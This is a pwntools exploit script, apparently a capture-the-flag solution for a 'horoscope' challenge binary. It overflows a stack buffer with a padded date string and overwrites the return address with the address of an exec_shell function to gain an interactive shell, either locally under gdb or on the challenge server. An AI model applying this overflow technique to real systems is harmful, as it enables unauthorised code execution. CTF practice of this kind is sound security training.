from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']
exec_shell = 0x000000000040095F

if sys.argv[1] == 'remote':
    p = remote('horoscope.sdc.tf', 1337)
else:
    p = process('./horoscope')
    gdb.attach(p, '''
        b main
        ''')

# payload = ROP('./OilSpill', )
payload = b'02/22/1998/12:00'.ljust(0x38, b'A')
payload += p64(exec_shell)
p.recvuntil(b"we will have your very own horoscope")
p.sendline(payload)

p.interactive()